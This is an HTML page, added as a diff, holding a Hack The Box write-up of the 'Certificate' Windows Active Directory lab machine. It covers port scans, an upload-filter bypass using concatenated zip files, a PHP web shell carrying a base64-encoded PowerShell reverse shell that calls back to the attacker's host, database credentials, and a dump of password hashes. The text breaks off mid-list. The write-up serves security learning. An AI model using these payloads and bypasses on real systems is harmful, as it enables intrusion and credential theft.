@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Certificate | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Enumerationm, SMB (445), HTTP (80)." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-certificate/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Certificate" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Enumerationm, SMB (445), HTTP (80)." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-certificate/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-certificate/og.png?v=cf967f37" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Certificate" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Enumerationm, SMB (445), HTTP (80)." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-certificate/og.png?v=cf967f37" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Certificate","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Enumerationm, SMB (445), HTTP (80).","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-certificate/","datePublished":"2026-11-03","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Certificate","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-certificate/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Certificate</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-11-03 · 18 min read</p><h1>Certificate</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Enumerationm, SMB (445), HTTP (80).</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Certificate" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-certificate.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-certificate.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Certificate</h2><p>Certificate is a hard Windows Active Directory machine that starts with an E-learning platform. The web application is vulnerable to Null-Byte Injection in its file upload feature, allowing a PHP reverse shell to be executed for initial access as xamppuser. Database credentials…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>31 May 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>Spectra199</dd></div><div><dt>Rating</dt><dd>4.1 / 5</dd></div><div><dt>User owns</dt><dd>3,100</dd></div><div><dt>Root owns</dt><dd>2,941</dd></div><div><dt>User blood</dt><dd>Vz0n<small class="room-blood-time">1H 13M 14S</small></dd></div><div><dt>Root blood</dt><dd>NLTE<small class="room-blood-time">1H 55M 53S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 3635 votes from easiest to hardest"><rect x="0" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>78 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>21 votes</title></rect><rect x="52" y="57" width="20" height="7" rx="2" fill="hsl(80 70% 55%)"><title>126 votes</title></rect><rect x="78" y="46" width="20" height="18" rx="2" fill="hsl(70 70% 55%)"><title>323 votes</title></rect><rect x="104" y="33" width="20" height="31" rx="2" fill="hsl(50 70% 55%)"><title>537 votes</title></rect><rect x="130" y="28" width="20" height="36" rx="2" fill="hsl(38 70% 55%)"><title>636 votes</title></rect><rect x="156" y="0" width="20" height="64" rx="2" fill="hsl(28 70% 55%)"><title>1123 votes</title></rect><rect x="182" y="33" width="20" height="31" rx="2" fill="hsl(16 70% 55%)"><title>544 votes</title></rect><rect x="208" y="56" width="20" height="8" rx="2" fill="hsl(8 70% 55%)"><title>134 votes</title></rect><rect x="234" y="58" width="20" height="6" rx="2" fill="hsl(0 70% 55%)"><title>113 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.3, Real-Life 6.9, CVE 6.5, Custom Exploitation 3.5, CTF-Like 3.1"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,58.9 155.9,95.1 136.7,146.8 95.6,129.8 89.4,103.3" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Certificate" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ sudo nxc smb 10.129.245.51 --generate-hosts-file /etc/hosts 
+SMB         10.129.245.51   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumerationm</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc01.certificate.htb -vv
+
+Nmap scan report for dc01.certificate.htb (10.129.245.51)
+Host is up, received user-set (0.014s latency).
+rDNS record for 10.129.245.51: DC01.certificate.htb
+Scanned at 2026-11-03 18:01:27 GMT for 66s
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+80/tcp    open  http             syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+9389/tcp  open  adws             syn-ack
+49666/tcp open  unknown          syn-ack
+49693/tcp open  unknown          syn-ack
+49695/tcp open  unknown          syn-ack
+49697/tcp open  unknown          syn-ack
+49716/tcp open  unknown          syn-ack
+56747/tcp open  unknown          syn-ack
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 66.20 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT -Pn dc01.certificate.htb
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-03 18:04 +0000
+Nmap scan report for dc01.certificate.htb (10.129.245.51)
+Host is up (0.014s latency).
+rDNS record for 10.129.245.51: DC01.certificate.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
+|_http-title: Certificate | Your portal for certification
+|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-04 02:04:12Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
+| Not valid before: 2026-03-12T20:45:13
+|_Not valid after:  2106-03-12T20:45:13
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
+| Not valid before: 2026-03-12T20:45:13
+|_Not valid after:  2106-03-12T20:45:13
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
+| Not valid before: 2026-03-12T20:45:13
+|_Not valid after:  2106-03-12T20:45:13
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
+| Not valid before: 2026-03-12T20:45:13
+|_Not valid after:  2106-03-12T20:45:13
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (95%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows 10 1903 - 22H2 (91%), Microsoft Windows 10 1909 - 2004 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><p>Null auth enabled by default with DCs however cannot use it to enumerate</p><p>The guest account is also disabled</p><h2>HTTP (80)</h2><p><img src="images/certificate/pasted-image-20261103181007.webp" alt="Screenshot" loading="lazy" /></p><p>Ill have a look around the site</p><p>The blog page has several potential users</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">charlie barber 
+mark wiens
+ben frank
+carol wood</code></pre><p>I can also register and login to the page</p><p>Nothing interesting on the login page, so i think the best next step is to create an account</p><p><img src="images/certificate/pasted-image-20261103183057.webp" alt="Screenshot" loading="lazy" /></p><p>Looks like i can choose the account type i create, if i create teacher i will need to tell support to activate it</p><p>This will be through the contact page</p><p><img src="images/certificate/pasted-image-20261103183433.webp" alt="Screenshot" loading="lazy" /></p><p>Ill create an account for both account types</p><p><img src="images/certificate/pasted-image-20261103183800.webp" alt="Screenshot" loading="lazy" /></p><p>Now after logging in i can reach this endpoint</p><p><img src="images/certificate/pasted-image-20261103183859.webp" alt="Screenshot" loading="lazy" /></p><p>Each page has a different trainer name</p><p>There is also a feedback section which is interesting</p><p>Looks like there is 4 courses available <code>?id=1-4</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">lorra armessa
+havok watterson
+sara laracrof
+john wood</code></pre><p>These are the trainer names from each of the courses</p><p>Ill try enrolling and testing the feedback option</p><p>Enrolling in the course gives me access to course content</p><p><img src="images/certificate/pasted-image-20261103193306.webp" alt="Screenshot" loading="lazy" /></p><p>There are certain parts of the course with file submission</p><p>It also says the file will be inspected by the course instructor</p><p><img src="images/certificate/pasted-image-20261103193522.webp" alt="Screenshot" loading="lazy" /></p><p>Uploading a .txt file shows an invalid MIME type error</p><h2>Reverse shell</h2><p><img src="images/certificate/pasted-image-20261103194429.webp" alt="Screenshot" loading="lazy" /></p><p>Ill upload a valid file format such as a pdf and i see there is a built in viewer</p><p><img src="images/certificate/pasted-image-20261103194501.webp" alt="Screenshot" loading="lazy" /></p><p>This is where they are stored, i can try a PHP web shell here</p><p>After testing its behavior i see that the zip file is the best bet, this is becuase the zip file bypasses any extension checks and content-type checks</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ zip -r shell.zip shell.php default.pdf</code></pre><p>I zipped a php web shell with a example pdf</p><p>After uploading i get a 400 error, this is likely because its detecting the file type .php after unzipping</p><p>But by uploading a .zip it bypasses content-type and extension checks</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&lt;?php
+shell_exec(&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAxACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#39;);
+?&gt;</code></pre><p>This is the contents of shell.php, i just grabbed the powershell base64 shell from revshells</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ zip -r default.zip default.pdf                                                   
+  adding: default.pdf (deflated 51%)
+  
+❯❯❯ zip -r shell.zip shell.php               
+  adding: shell.php (stored 0%)</code></pre><p>Ill zip both of these files individually</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ cat default.zip shell.zip &gt; rce.zip</code></pre><p>Then ill cat both files out with the .pdf file first then put this in a zip file</p><p><img src="images/certificate/pasted-image-20261103201938.webp" alt="Screenshot" loading="lazy" /></p><p>The upload succeeds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ rlwrap nc -lnvp 1337
+listening on [any] 1337 ...</code></pre><p>Ill start a listener</p><p>Then ill click the link to open the upload, it takes me to the pdf in the URL, so ill just change it from <code>default.pdf</code> to <code>shell.php</code></p><p><img src="images/certificate/pasted-image-20261103203632.webp" alt="Screenshot" loading="lazy" /></p><p>I now have a shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\xampp\htdocs\certificate.htb&gt; dir
+
+
+    Directory: C:\xampp\htdocs\certificate.htb
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       12/26/2024   1:49 AM                static                                                                
+-a----       12/24/2024  12:45 AM           7179 about.php                                                             
+-a----       12/30/2024   1:50 PM          17197 blog.php                                                              
+-a----       12/30/2024   2:02 PM           6560 contacts.php                                                          
+-a----       12/24/2024   6:10 AM          15381 course-details.php                                                    
+-a----       12/24/2024  12:53 AM           4632 courses.php                                                           
+-a----       12/23/2024   4:46 AM            549 db.php                                                                
+-a----       12/22/2024  10:07 AM           1647 feature-area-2.php                                                    
+-a----       12/22/2024  10:22 AM           1331 feature-area.php                                                      
+-a----       12/22/2024  10:16 AM           2955 footer.php                                                            
+-a----       12/23/2024   5:13 AM           2351 header.php                                                            
+-a----       12/24/2024  12:52 AM           9497 index.php                                                             
+-a----       12/25/2024   1:34 PM           5908 login.php                                                             
+-a----       12/23/2024   5:14 AM            153 logout.php                                                            
+-a----       12/24/2024   1:27 AM           5321 popular-courses-area.php                                              
+-a----       12/25/2024   1:27 PM           8240 register.php                                                          
+-a----       12/28/2024  11:26 PM          10366 upload.php                                                            
+
+
+PS C:\xampp\htdocs\certificate.htb&gt;</code></pre><p>Ill look into <code>db.php</code></p><p><img src="images/certificate/pasted-image-20261103203900.webp" alt="Screenshot" loading="lazy" /></p><p>There is credentials stored here</p><p>Checking internal ports 3306 is open, which indicated mysql</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\xampp\htdocs\certificate.htb&gt; net user
+
+User accounts for \\DC01
+
+-------------------------------------------------------------------------------
+Administrator            akeder.kh                Alex.D                   
+Aya.W                    Eva.F                    Guest                    
+John.C                   Kai.X                    kara.m                   
+karol.s                  krbtgt                   Lion.SK                  
+Maya.K                   Nya.S                    Ryan.K                   
+saad.m                   Sara.B                   xamppuser                
+The command completed successfully.
+
+PS C:\xampp\htdocs\certificate.htb&gt;</code></pre><p>Also these are the users</p><h2>Lateral movement</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\xampp\htdocs\certificate.htb&gt; C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p&#39;cert!f!c@teDBPWD&#39; -e &quot;SHOW DATABASES;&quot;
+Database
+certificate_webapp_db
+information_schema
+test
+PS C:\xampp\htdocs\certificate.htb&gt; </code></pre><p>Ill do some enumeration into the databases</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\xampp\htdocs\certificate.htb&gt; \xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p&#39;cert!f!c@teDBPWD&#39; -e &quot;USE certificate_webapp_db; SHOW TABLES&quot;
+Tables_in_certificate_webapp_db
+course_sessions
+courses
+users
+users_courses
+PS C:\xampp\htdocs\certificate.htb&gt; </code></pre><p>These are the tables from the DB referenced in the php source code</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\xampp\htdocs\certificate.htb&gt; \xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p&#39;cert!f!c@teDBPWD&#39; -e &quot;USE certificate_webapp_db; SELECT * FROM users&quot;
+id	first_name	last_name	username	email	password	created_at	role	is_active
+1	Lorra	Armessa	Lorra.AAA	lorra.aaa@certificate.htb	$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG	2024-12-23 12:43:10	teacher	1
+6	Sara	Laracrof	Sara1200	sara1200@gmail.com	$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK	2024-12-23 12:47:11	teacher	1
+7	John	Wood	Johney	johny009@mail.com	$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq	2024-12-23 13:18:18	student	1
+8	Havok	Watterson	havokww	havokww@hotmail.com	$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti	2024-12-24 09:08:04	teacher	1
+9	Steven	Roman	stev	steven@yahoo.com	$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2	2024-12-24 12:05:05	student	1
+10	Sara	Brawn	sara.b	sara.b@certificate.htb	$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6	2024-12-25 21:31:26	admin	1
+12	student	student	student	student@student.com	$2y$04$qG.Qlmp943zS/JPdfa/.UebEEzW3Y94mrXzKBkqljzsbL/U2je3qy	2026-11-03 18:34:54	student	1
+PS C:\xampp\htdocs\certificate.htb&gt;</code></pre><p>Then ill just dump the users table</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Lorra.AAA:$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
+Sara1200:$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
+Johney:$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
+havokww:$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
+stev:$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
